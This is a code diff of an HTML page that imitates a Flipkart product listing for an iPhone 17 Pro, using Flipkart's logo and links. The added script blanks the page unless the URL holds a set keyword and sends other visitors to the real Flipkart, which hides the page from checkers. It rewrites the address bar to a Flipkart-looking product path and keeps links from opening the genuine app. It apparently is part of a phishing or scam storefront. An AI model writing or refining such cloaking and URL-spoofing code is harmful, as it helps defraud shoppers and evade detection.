@@ -5,28 +5,39 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Apple iPhone 17 Pro - Flipkart</title>
 
-<!-- Anti-Flicker / Anti-Flash Verification Guard -->
+<!-- Anti-Flicker / Anti-Flash Verification Guard & SPA URL Restorer -->
 <style id="antiFlashStyle">
   body { display: none !important; }
 </style>
 <script>
   (function() {
-    const PRODUCT_URL_PATH = '/kk/apple-iphone-17-pro-deep-blue-256-gb/p/itm76fe37ca9ea8c';
-    const VERIFY_KEYWORD = 'apple-iphone-17-pro';
-    const fullHref = window.location.href;
-    const isLocal = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1' || window.location.protocol === 'file:';
+    var VERIFY_KEYWORD = 'apple-iphone-17-pro';
+    var fullHref = window.location.href;
+    var search = window.location.search;
+    var isLocal = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1' || window.location.protocol === 'file:';
 
-    if (fullHref.includes(VERIFY_KEYWORD) || isLocal) {
-      try {
-        window.history.replaceState({ product: true }, '', PRODUCT_URL_PATH);
-      } catch(e) {}
-      // Reveal page immediately when DOM is parsed
+    // 1. Verify keyword exists in the URL or query string
+    if (fullHref.indexOf(VERIFY_KEYWORD) !== -1 || isLocal) {
+      
+      // 2. Decode and restore the exact original long URL from 404.html redirect
+      if (search && search.indexOf('p=') !== -1) {
+        try {
+          var param = search.split('p=')[1];
+          if (param) {
+            var originalPath = decodeURIComponent(param.split('&')[0]);
+            var cleanUrl = '/kk' + originalPath;
+            window.history.replaceState({ product: true }, '', cleanUrl);
+          }
+        } catch(e) {}
+      }
+
+      // 3. Reveal page once DOM is parsed
       document.addEventListener('DOMContentLoaded', function() {
-        const style = document.getElementById('antiFlashStyle');
+        var style = document.getElementById('antiFlashStyle');
         if (style) style.remove();
       });
     } else {
-      // Immediate redirect without rendering content
+      // 4. Unauthorized direct access without keyword
       window.location.replace('https://www.flipkart.com');
     }
   })();
@@ -750,13 +761,13 @@
 <body>
 
 <div class="mobile-container">
-  <!-- Header (Forced to stay in browser via openInWeb) -->
+  <!-- Header (Forced to stay in web browser) -->
   <header class="topbar">
     <div class="brand-logo" onclick="openInWeb(event, 'https://www.flipkart.com')" title="Flipkart">
       <img src="https://static-assets-web.flixcart.com/batman-returns/batman-returns/p/images/fk-mp-c815b6.svg" alt="Flipkart">
     </div>
     <div class="header-actions">
-      <!-- Search (opens in browser) -->
+      <!-- Search -->
       <button type="button" onclick="openInWeb(event, 'https://www.flipkart.com/searchsuggestion')" class="header-icon-btn" title="Search">
         <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
           <circle cx="11" cy="11" r="8"></circle>
@@ -764,7 +775,7 @@
         </svg>
       </button>
 
-      <!-- Cart (opens in browser) -->
+      <!-- Cart -->
       <button type="button" onclick="openInWeb(event, 'https://www.flipkart.com/viewcart')" class="header-icon-btn" title="Cart">
         <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
           <circle cx="9" cy="21" r="1"></circle>
@@ -1181,14 +1192,10 @@
 <div id="invisibleRefreshTrigger" onclick="handleInvisibleTrigger()" title="Back to Product"></div>
 
 <script>
-  const PRODUCT_URL_PATH = '/kk/apple-iphone-17-pro-deep-blue-256-gb/p/itm76fe37ca9ea8c';
-
-  // Force Links to Open in Browser on Same Tab (Prevents Mobile App Auto-Open)
+  // Force Links to Open inside Web Browser on Same Tab (Prevents Mobile App Auto-Open)
   function openInWeb(e, targetUrl) {
     if (e && e.preventDefault) e.preventDefault();
     if (e && e.stopPropagation) e.stopPropagation();
-    
-    // Using direct JS navigation without anchor tag intent prevents Android & iOS app redirects
     window.location.assign(targetUrl);
   }
 
@@ -1288,7 +1295,7 @@
     refreshTrigger.style.display = 'none';
 
     try {
-      window.history.replaceState({ product: true }, '', PRODUCT_URL_PATH);
+      window.history.back();
     } catch(err) {}
   }
 
